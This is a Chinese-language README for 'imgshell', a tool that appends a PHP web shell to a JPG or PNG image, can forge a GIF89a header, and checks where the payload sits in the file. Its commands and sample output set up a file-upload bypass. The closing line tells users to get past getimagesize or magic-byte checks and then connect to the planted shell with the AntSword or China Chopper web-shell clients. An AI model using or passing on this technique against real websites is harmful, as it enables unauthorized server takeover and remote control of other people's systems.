# imgshell 使用说明

## 依赖

```
pip install pillow    # 仅自测需要
```

## 命令

```bash
python imgshell.py --selftest                       # 自测

python imgshell.py --make shell.jpg -p shell.php -o out.jpg   # 生成图片马
python imgshell.py --make a.png -p shell.php -o out.png --pre GIF89a   # 覆盖文件头
python imgshell.py --check out.jpg                  # 校验头部与 payload 位置
```

## 参数

| 参数 | 说明 |
|------|------|
| `--make IMAGE` | 载体图片 |
| `-p FILE` | payload 文件 |
| `-o FILE` | 输出路径 |
| `--pre MAGIC` | 覆盖文件头(如 GIF89a) |
| `--check FILE` | 校验: 文件头是否完整 + payload 偏移 |

## 输出

```
已生成: out.jpg (图片 633B + payload 25B)
图片头: jpg
发现 payload 标记 '<?php' @ offset 633
```

配合文件上传: 文件类型检测(getimagesize/魔数)通过后, 用蚁剑/菜刀按图片后缀连接。
